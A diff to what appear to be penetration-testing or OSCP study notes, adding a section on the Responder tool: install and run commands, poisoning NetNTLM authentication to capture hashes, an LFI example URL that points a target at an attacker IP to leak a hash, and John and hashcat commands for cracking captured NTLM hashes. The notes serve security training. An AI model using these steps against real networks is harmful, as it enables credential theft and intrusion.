@@ -74,5 +74,22 @@ Rubeus
     
 [ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   
 
- 
+ ## Responder (not allowed on the OSCP exam, but a common pen testing tool)   
+Allows you to spoof various services then capture hashes from devices that try to authenticate to those.  
+Common use: poison responses during NetNTLM authentication to capture credentials. Might be able to relay the challenge instead of just capturing it (if SMB signing is not enforced). Ref: https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html       
+  
+Install:   
+
+    git clone https://github.com/lgandx/Responder   
+ Usage:   
+
+     sudo responder.py -I eth0   #start on specified interface. Hashes will be captured when a device tries to authenticate to resources on the network.               
+    
+You might be able to use a LFI vulnerability to request a resource and capture a hash using Responder. Ex - http://site.com/?page=//10.10.14.25/somefile           
+Captured hashes will be stored in the logs folder, in a .txt file named for the protcol-hash type- and IP captured from.     
+Crack Hashes from responder:     
+
+    john hashes.txt   #John the Ripper will automatically detect the format of hashes collected by Responder.    
+    hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
+    hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)   
 
